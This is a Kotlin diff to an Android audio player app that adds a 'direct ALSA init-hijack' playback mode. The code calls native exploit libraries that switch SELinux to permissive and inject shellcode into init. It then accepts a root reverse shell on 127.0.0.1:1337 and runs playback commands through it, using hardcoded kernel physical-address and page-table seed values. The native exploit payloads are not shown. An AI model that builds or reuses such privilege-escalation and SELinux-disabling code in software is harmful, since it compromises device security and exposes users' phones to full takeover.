+                    if (!stopped && itemIndex < items.lastIndex) {
+                        waitBeforeNext(
+                            runId = runId,
+                            delayMillis = differentFileDelayMillis,
+                            nextItem = items[itemIndex + 1],
+                            nextRepeat = 1
+                        )
+                    }
+                }
+                Log.i(
+                    LOG_TAG,
+                    "ALSA stream complete file=${items.joinToString { item -> item.displayName }} " +
+                        "api=pcm_write rootVerified=true path=init-hijack"
+                )
+            } finally {
+                // Keep the root shell alive for the next Play.
+                createdAggregates.forEach { file -> runCatching { file.delete() } }
+                val rootAlsaCache = File(context.cacheDir, ROOT_ALSA_CACHE_DIRECTORY_NAME)
+                runCatching { rootAlsaCache.deleteRecursively() }
+            }
+        }
+    }
+
+    /**
+     * Reuse the persistent init-hijack root shell if it is still alive, otherwise
+     * run the exploit chain (permissive + init-hijack) and accept a fresh shell.
+     */
+    private fun acquireInitHijackShell(
+        workdir: File,
+        server: ServerSocket,
+        runId: Int
+    ): InitHijackSession {
+        val existing = initHijackShell
+        if (existing != null && existing.isAlive()) {
+            Log.i(LOG_TAG, "A2M_INIT_HIJACK_REUSE existing root shell")
+            return existing
+        }
+        existing?.close()
+        initHijackShell = null
+
+        Log.i(
+            LOG_TAG,
+            "ALSA init-hijack listener ready 127.0.0.1:$INIT_HIJACK_LISTEN_PORT"
+        )
+        if (isSelinuxPermissive()) {
+            Log.i(LOG_TAG, "A2M_INIT_HIJACK_PERMISSIVE already permissive")
+        } else {
+            postPathStatus("init-hijack: SELinux permissive 적용 중...", runId)
+            val permissiveAcquired = waitForPermissiveWithRetry(runId, workdir)
+            if (!permissiveAcquired) {
+                error("init-hijack: SELinux permissive 적용 실패 (조용한 힙에서 재시도)")
+            }
+            Log.i(LOG_TAG, "A2M_INIT_HIJACK_PERMISSIVE_OK")
+        }
+
+        var s34Attempt = 0
+        var connected = false
+        while (s34Attempt < INIT_HIJACK_S34_ATTEMPTS && !connected && !stopped) {
+            s34Attempt += 1
+            postPathStatus(
+                "init-hijack: root shell 획득 시도 $s34Attempt/${INIT_HIJACK_S34_ATTEMPTS}...",
+                runId
+            )
+            val s34Pid = ExploitNative.runInitHijack(workdir.absolutePath)
+            Log.i(
+                LOG_TAG,
+                "A2M_INIT_HIJACK_S34 child pid=$s34Pid attempt=$s34Attempt"
+            )
+            connected = runCatching {
+                val session = InitHijackSession()
+                session.connect(workdir, server)
+                initHijackShell = session
+                true
+            }.getOrElse { exception ->
+                Log.w(
+                    LOG_TAG,
+                    "A2M_INIT_HIJACK_ACCEPT attempt $s34Attempt failed",
+                    exception
+                )
+                false
+            }
+        }
+        if (!connected) {
+            error("init-hijack: root shell 획득 실패 (${INIT_HIJACK_S34_ATTEMPTS}회 시도)")
+        }
+
+        val session = checkNotNull(initHijackShell)
+        val identity = session.verifyRoot()
+        Log.i(LOG_TAG, "A2M_INIT_HIJACK_ROOT $identity")
+        return session
+    }
+
+    /**
+     * One persistent loopback listener on 127.0.0.1:1337 for the whole app
+     * process. Reused across runs so we never have to re-bind (which can hit
+     * EADDRINUSE from a leftover root-shell connection / TIME_WAIT). Closed on
+     * stop/release; recreated on the next run.
+     */
+    private fun ensureInitHijackServerSocket(): ServerSocket {
+        return InitHijackListenerHolder.acquire()
+    }
+
+    private fun prepareInitHijackSeedFiles(workdir: File) {
+        File(workdir, "cand").writeText(INIT_HIJACK_SELINUX_STATE_PHYS_HEX)
+        File(workdir, "attr").writeText(INIT_HIJACK_PTE_ATTR_INDEX_HEX)
+    }
+
+    private fun isSelinuxPermissive(): Boolean {
+        return runCatching {
+            File("/sys/fs/selinux/enforce").readText().trim() == "0"
+        }.getOrDefault(false)
+    }
+
+    private fun waitForPermissiveWithRetry(runId: Int, workdir: File): Boolean {
+        if (isSelinuxPermissive()) {
+            Log.i(LOG_TAG, "A2M_INIT_HIJACK_PERMISSIVE already permissive")
+            return true
+        }
+        var attempts = 0
+        while (attempts < INIT_HIJACK_PERMISSIVE_ATTEMPTS && !stopped) {
+            attempts += 1
+            val pid = ExploitNative.applyPermissive(workdir.absolutePath)
+            Log.i(
+                LOG_TAG,
+                "A2M_INIT_HIJACK_PERMISSIVE child pid=$pid attempt=$attempts"
+            )
+            postPathStatus("init-hijack: SELinux permissive 시도 $attempts...", runId)
+            val deadline =
+                SystemClock.elapsedRealtime() + INIT_HIJACK_PERMISSIVE_TIMEOUT_MILLIS
+            while (!stopped && SystemClock.elapsedRealtime() < deadline) {
+                if (isSelinuxPermissive()) return true
+                Thread.sleep(INIT_HIJACK_PERMISSIVE_POLL_MILLIS)
+            }
+            Log.w(
+                LOG_TAG,
+                "A2M_INIT_HIJACK_PERMISSIVE attempt $attempts timed out"
+            )
+        }
+        return false
+    }
+
+    private fun playInitHijackAggregate(
+        session: InitHijackSession,
+        profile: RootAlsaProfile,
+        aggregate: File,
+        item: QueueItem,
+        wavSpec: WavPcmSpec,
+        runId: Int
+    ) {
+        val wavPath = aggregate.absolutePath
+        Log.i(
+            LOG_TAG,
+            "ALSA init-hijack start profile=${profile.label} file=${item.displayName} " +
+                "aggregate=$wavPath"
+        )
+        postPathStatus("실제: Direct ALSA (init-hijack) / ${profile.pcmNode}", runId)
+
+        val routeEnabled = session.sendCommand(
+            profile.routeEnableCommand,
+            INIT_HIJACK_COMMAND_TIMEOUT_MILLIS
+        )
+        Log.i(
+            LOG_TAG,
+            "A2M_ALSA_ROUTE_ENABLED ${routeEnabled.trim().lines().lastOrNull()}"
+        )
+
+        val playOutput = session.sendCommand(
+            "$ROOT_ALSA_TINYPLAY_PATH ${shellQuote(wavPath)} " +
+                "-D ${profile.card} -d ${profile.pcmDevice} -p ${profile.periodSize} " +
+                "-n ${profile.periodCount}",
+            INIT_HIJACK_TINYPLAY_TIMEOUT_MILLIS
+        )
+        if (
+            playOutput.contains("Unable to open", ignoreCase = true) ||
+            playOutput.contains("Error playing", ignoreCase = true)
+        ) {
+            error("init-hijack tinyplay reported a playback error")
+        }
+        check(playOutput.contains("Playing sample", ignoreCase = true)) {
+            "init-hijack tinyplay did not confirm playback"
+        }
+
+        val routeDisabled = session.sendCommand(
+            profile.routeDisableCommand,
+            INIT_HIJACK_COMMAND_TIMEOUT_MILLIS
+        )
+        Log.i(
+            LOG_TAG,
+            "A2M_ALSA_ROUTE_DISABLED ${routeDisabled.trim().lines().lastOrNull()}"
+        )
+        Log.i(
+            LOG_TAG,
+            "A2M_ALSA_PCM_COMPLETE file=${item.displayName} node=${profile.pcmNode} " +
+                "sampleRate=${wavSpec.sampleRate} bits=${wavSpec.bitsPerSample} " +
+                "api=pcm_write rootVerified=true"
+        )
+    }
+
+    /**
+     * One accepted root reverse shell (from the init-hijack shellcode, in pid 1
+     * context). All playback commands go through this TCP session with explicit
+     * __A2M_RC_* markers so completion (and the shell's exit code) is detected.
+     */
+    private inner class InitHijackSession {
+        private var socket: Socket? = null
+        private var reader: BufferedReader? = null
+        private var writer: OutputStream? = null
+        private var markerId = 0
+
+        fun connect(workdir: File, server: ServerSocket) {
+            var accepted = 0
+            val deadline = SystemClock.elapsedRealtime() + INIT_HIJACK_ACCEPT_TIMEOUT_MILLIS
+            while (accepted < INIT_HIJACK_MAX_ACCEPTS && !stopped) {
+                val remaining = deadline - SystemClock.elapsedRealtime()
+                if (remaining <= 0L) {
+                    throw IllegalStateException(
+                        "init-hijack: root shell 연결 대기 시간 초과 " +
+                            "(${INIT_HIJACK_ACCEPT_TIMEOUT_MILLIS}ms)"
+                    )
+                }
+                val client = try {
+                    server.accept()
+                } catch (exception: java.net.SocketTimeoutException) {
+                    continue
+                } catch (exception: Exception) {
+                    if (stopped) throw exception
+                    throw IllegalStateException(
+                        "init-hijack: root shell 연결 수락 실패",
+                        exception
+                    )
+                }
+                accepted += 1
+                client.soTimeout = INIT_HIJACK_COMMAND_TIMEOUT_MILLIS
+                socket = client
+                reader = client.getInputStream().bufferedReader()
+                writer = client.getOutputStream()
+                val identity = runCatching {
+                    sendCommand("id", INIT_HIJACK_ID_PROBE_TIMEOUT_MILLIS)
+                }.getOrNull()
+                if (identity != null && identity.contains("uid=0(root)")) {
+                    Log.i(
+                        LOG_TAG,
+                        "A2M_INIT_HIJACK_ACCEPT accepted#$accepted root=${identity.trim()}"
+                    )
+                    return
+                }
+                Log.w(
+                    LOG_TAG,
+                    "init-hijack connection #$accepted is not a root shell; closing"
+                )
+                runCatching { client.close() }
+                socket = null
+                reader = null
+                writer = null
+            }
+            error("init-hijack: root shell 연결 실패 (${INIT_HIJACK_MAX_ACCEPTS}회 시도)")
+        }
+
+        /** True if the shell connection is still open and answers as root. */
+        fun isAlive(): Boolean {
+            val client = socket ?: return false
+            if (client.isClosed || !client.isConnected) return false
+            return runCatching {
+                val output = sendCommand("echo A2M_ALIVE", INIT_HIJACK_ID_PROBE_TIMEOUT_MILLIS)
+                output.contains("A2M_ALIVE")
+            }.getOrDefault(false)
+        }
+
+        fun verifyRoot(): String {
+            val output = sendCommand("id", INIT_HIJACK_COMMAND_TIMEOUT_MILLIS)
+            check(output.contains("uid=0(root)")) {
+                "init-hijack: root identity 확인 실패: $output"
+            }
+            return output.trim()
+        }
+
+        fun sendCommand(command: String, timeoutMillis: Int): String {
+            val out = checkNotNull(writer) { "init-hijack: shell 연결 없음" }
+            val inReader = checkNotNull(reader) { "init-hijack: shell 연결 없음" }
+            val client = checkNotNull(socket) { "init-hijack: shell 연결 없음" }
+            val id = markerId++
+            val collected = mutableListOf<String>()
+            out.write("echo __A2M_RC_START__ $id\n".toByteArray(StandardCharsets.US_ASCII))
+            out.write("$command\n".toByteArray(StandardCharsets.US_ASCII))
+            out.write("echo __A2M_RC_END__ $id \$?\n".toByteArray(StandardCharsets.US_ASCII))
+            out.flush()
+            client.soTimeout = timeoutMillis
+            val endPrefix = "__A2M_RC_END__ $id "
+            while (!stopped) {
+                val line = inReader.readLine() ?: break
+                collected.add(line)
+                val trimmed = line.trim()
+                if (trimmed.startsWith(endPrefix)) {
+                    val rc = trimmed.removePrefix(endPrefix).trim()
+                    if (rc != "0") {
+                        throw IllegalStateException(
+                            "init-hijack shell command failed (rc=$rc): $command\n" +
+                                collected.joinToString("\n")
+                        )
+                    }
+                    return collected.joinToString("\n")
+                }
+            }
+            throw IllegalStateException("init-hijack shell command timeout: $command")
+        }
+
+        fun close() {
+            runCatching {
+                writer?.write("exit\n".toByteArray(StandardCharsets.US_ASCII))
+                writer?.flush()
+            }
+            runCatching { socket?.close() }
+            socket = null
+            reader = null
+            writer = null
         }
     }
 
@@ -2527,6 +3197,48 @@ private class AudioQueuePlayer(
                 onError(message)
             }
         }
+    }
+}
+
+private object ExploitNative {
+    init {
+        System.loadLibrary("a2m_perm")
+        System.loadLibrary("a2m_s34")
+    }
+
+    external fun applyPermissive(workdir: String): Int
+
+    external fun runInitHijack(workdir: String): Int
+}
+
+/**
+ * Process-lifetime holder for the 127.0.0.1:1337 listener. Reused across every
+ * play()/activity recreation within a process so we never re-bind (a leftover
+ * root-shell connection or an old listener from a previous run would otherwise
+ * make a fresh bind fail with EADDRINUSE). Only the process death releases it.
+ */
+private object InitHijackListenerHolder {
+    @Volatile
+    private var server: ServerSocket? = null
+
+    @Synchronized
+    fun acquire(): ServerSocket {
+        server?.let { existing ->
+            if (!existing.isClosed) return existing
+        }
+        val created = ServerSocket()
+        created.reuseAddress = true
+        created.bind(
+            java.net.InetSocketAddress(
+                InetAddress.getByName(INIT_HIJACK_LOOPBACK_HOST),
+                INIT_HIJACK_LISTEN_PORT
+            ),
+            INIT_HIJACK_LISTEN_BACKLOG
+        )
+        created.soTimeout = INIT_HIJACK_ACCEPT_POLL_MILLIS
+        server = created
+        Log.i(LOG_TAG, "A2M_INIT_HIJACK_LISTENER bound 127.0.0.1:$INIT_HIJACK_LISTEN_PORT")
+        return created
     }
 }
 
@@ -3017,6 +3729,7 @@ private const val DEBUG_SAME_DELAY_EXTRA = "debugSameDelay"
 private const val DEBUG_DIFFERENT_DELAY_EXTRA = "debugDifferentDelay"
 private const val DEBUG_AAUDIO_EXCLUSIVE_EXTRA = "debugUseAaudioExclusive"
 private const val DEBUG_DIRECT_ALSA_EXTRA = "debugUseDirectAlsa"
+private const val DEBUG_DIRECT_ALSA_INIT_HIJACK_EXTRA = "debugUseDirectAlsaInitHijack"
 private const val DEBUG_LOW_LATENCY_AUDIOTRACK_EXTRA = "debugUseLowLatencyAudioTrack"
 private const val DEBUG_FORCE_STEREO_ROUTE_ASSIST_EXTRA = "debugForceStereoRouteAssist"
 private const val DEBUG_DIRECT_ALSA_PCM_DEVICE_EXTRA = "debugDirectAlsaPcmDevice"
@@ -3027,6 +3740,7 @@ private const val PERSISTED_PLAYLIST_SAME_DELAY = "same-delay"
 private const val PERSISTED_PLAYLIST_DIFFERENT_DELAY = "different-delay"
 private const val PERSISTED_PLAYLIST_AAUDIO = "aaudio"
 private const val PERSISTED_PLAYLIST_DIRECT_ALSA = "direct-alsa"
+private const val PERSISTED_PLAYLIST_INIT_HIJACK = "direct-alsa-init-hijack"
 private const val PERSISTED_PLAYLIST_LOW_LATENCY = "low-latency"
 private const val PERSISTED_PLAYLIST_ROUTE_ASSIST = "route-assist"
 private const val PERSISTED_PLAYLIST_PCM_DEVICE = "pcm-device"
@@ -3041,6 +3755,22 @@ private const val ROOT_ALSA_PROOF_TAIL_MILLIS = 150L
 private const val ROOT_ALSA_ROUTE_THREAD_JOIN_MILLIS = 1_000L
 private const val ROOT_ALSA_PROCESS_TIMEOUT_SECONDS = 300L
 private const val ROOT_ALSA_CLEANUP_TIMEOUT_SECONDS = 5L
+private const val INIT_HIJACK_WORKDIR_NAME = "init-hijack"
+private const val INIT_HIJACK_LOOPBACK_HOST = "127.0.0.1"
+private const val INIT_HIJACK_LISTEN_PORT = 1337
+private const val INIT_HIJACK_LISTEN_BACKLOG = 8
+private const val INIT_HIJACK_MAX_ACCEPTS = 3
+private const val INIT_HIJACK_PERMISSIVE_ATTEMPTS = 2
+private const val INIT_HIJACK_PERMISSIVE_TIMEOUT_MILLIS = 120_000L
+private const val INIT_HIJACK_PERMISSIVE_POLL_MILLIS = 2_000L
+private const val INIT_HIJACK_COMMAND_TIMEOUT_MILLIS = 30_000
+private const val INIT_HIJACK_ID_PROBE_TIMEOUT_MILLIS = 15_000
+private const val INIT_HIJACK_TINYPLAY_TIMEOUT_MILLIS = 600_000
+private const val INIT_HIJACK_ACCEPT_TIMEOUT_MILLIS = 180_000L
+private const val INIT_HIJACK_ACCEPT_POLL_MILLIS = 2_000
+private const val INIT_HIJACK_S34_ATTEMPTS = 3
+private const val INIT_HIJACK_SELINUX_STATE_PHYS_HEX = "82eb33b8"
+private const val INIT_HIJACK_PTE_ATTR_INDEX_HEX = "4"
 private const val WAV_UINT32_MAX = 0xffffffffL
 private const val DOCUMENT_PICKER_SHOW_ADVANCED_EXTRA = "android.provider.extra.SHOW_ADVANCED"
 private const val WAV_CHUNK_HEADER_SIZE = 8
